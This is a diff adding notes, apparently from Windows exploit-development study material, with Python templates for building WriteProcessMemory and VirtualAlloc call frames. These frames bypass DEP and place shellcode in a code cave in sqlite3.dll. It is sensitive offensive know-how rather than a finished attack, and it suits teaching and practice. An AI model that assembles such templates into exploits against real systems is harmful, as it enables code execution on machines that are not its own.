@@ -79,3 +79,25 @@ Alternative: Use Pykd code caver: https://github.com/nop-tech/code_caver
 ```
 !py C:\Users\admin\Desktop\code_caver.py <startAddress> <endAddress>
 ```
+
+# Stack set-ups
+WriteProcessMemory:
+```
+# kernel32!WriteProcessMemory placeholder parameters
+crash += struct.pack('<L', 0x61c832e4)    # Pointer to kernel32!WriteFileImplementation (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
+crash += struct.pack('<L', 0x61c72530)    # Return address parameter placeholder (where function will jump to after execution - which is where shellcode will be written to. This is an executable code cave in the .text section of sqlite3.dll)
+crash += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
+crash += struct.pack('<L', 0x61c72530)    # lpBaseAddress = pointer to where shellcode will be written to. (0x61C72530 is an executable code cave in the .text section of sqlite3.dll) 
+crash += struct.pack('<L', 0x11111111)    # lpBuffer = base address of shellcode (dynamically generated)
+crash += struct.pack('<L', 0x22222222)    # nSize = size of shellcode 
+crash += struct.pack('<L', 0x1004D740)    # lpNumberOfBytesWritten = writable location (.idata section of ImageLoad.dll address in a code cave)
+```
+VirtualAlloc:
+```
+functionAddress = b"AAAA"       # VirtualAllocStub address
+shellcodeAddress = b"BBBB"      # shellcode address
+param1 = b"CCCC"                # lpAddress = shellcode address
+param2 = b"DDDD"                # dwSize
+param3 = b"EEEE"                # flAllocationType
+param4 = b"FFFF"                # flProtect
+```
